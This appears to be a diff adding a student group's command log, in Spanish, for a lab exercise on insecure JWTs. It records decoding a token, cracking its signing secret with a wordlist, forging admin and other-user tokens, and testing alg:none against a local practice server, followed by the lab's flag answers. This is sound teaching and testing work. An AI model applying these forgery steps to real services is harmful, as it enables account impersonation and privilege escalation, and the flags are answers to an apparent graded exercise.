@@ -1,0 +1,50 @@
+# Lab Extra 5 — JWT inseguro — Grupo 08 — comandos de la Parte 1 (práctica)
+# Portal levantado con: PORT=8099 python3 labs/labextra5-jwt/objetivo/server.py
+# (en el informe se usa el puerto 8080 por defecto; acá 8099 para no chocar)
+# jwt_tool.py = entregas/labextra5/grupo08/src/jwt_tool.py
+
+# --- Conseguir token de diego (credenciales públicas de demo) ---
+curl -s 'localhost:8080/login?user=diego&pass=diego123'
+
+# --- R1: decodificar (el claim nota_interna no debería viajar) ---
+python3 src/jwt_tool.py decodificar <token>
+
+# --- R2: crackear secreto offline + forjar role=admin ---
+python3 src/jwt_tool.py crackear <token> ../../../labs/labextra5-jwt/caso/diccionario.txt
+python3 src/jwt_tool.py forjar mate123 --sub diego --role admin
+curl -s -H 'Authorization: Bearer <token-admin>' localhost:8080/admin
+
+# --- R3: forjar identidad sub=maria ---
+python3 src/jwt_tool.py forjar mate123 --sub maria --role user
+curl -s -H 'Authorization: Bearer <token-maria>' localhost:8080/perfil
+
+# --- Control de sanidad (§4) ---
+# (a) token real de diego (role=user) contra /admin -> 403
+curl -s -H 'Authorization: Bearer <token-real-diego>' localhost:8080/admin
+# (b) token forjado con 1 char cambiado en la firma -> 401
+curl -s -H 'Authorization: Bearer <token-admin-corrupto>' localhost:8080/admin
+
+# --- P4: alg:none (firma vacía) contra /admin -> 401 ---
+curl -s -H 'Authorization: Bearer <token-alg-none>' localhost:8080/admin
+
+# --- Entrega de flags ---
+./ctf submit extra5 R1 'FLAG{jwt_solo_base64}'
+./ctf submit extra5 R2 'FLAG{jwt_forjado_admin}'
+./ctf submit extra5 R3 'FLAG{jwt_suplantacion_idor}'
+./ctf status extra5
+
+# ======================= PARTE 2 (análisis P3-P5) =======================
+# Entorno: WSL Ubuntu (Python 3.12.3), app sin Docker (stdlib). Portal en :8099.
+# Los scripts corren bajo Linux; .gitattributes fuerza LF en *.sh.
+# Reproducción completa de la cadena + sanidad + alg:none + medición:
+bash entregas/labextra5/grupo08/evidencia/scripts/parte2-run.sh
+#   -> salidas/10-parte2-cadena.txt       (R1-R3 revalidados, HTTP 200 + flags)
+#   -> salidas/11-parte2-sanidad.txt       (a: real diego /admin 403; b: firma alterada 401)
+#   -> salidas/12-parte2-alg-none.txt      (alg:none vacía/basura + HS256 secreto malo -> 401 los 3)
+#   -> salidas/13-parte2-medicion-crack.txt (crack offline: 0.071 ms cripto / 8.8 ms con I/O)
+
+# P4 (demo dedicada de alg:none, requiere el portal levantado en $PORT):
+PORT=8099 python3 entregas/labextra5/grupo08/evidencia/scripts/parte2-alg-none.py
+
+# P2 (medición reproducible del crack, no toca el servidor):
+python3 entregas/labextra5/grupo08/evidencia/scripts/parte2-medir-crack.py <token> labs/labextra5-jwt/caso/diccionario.txt
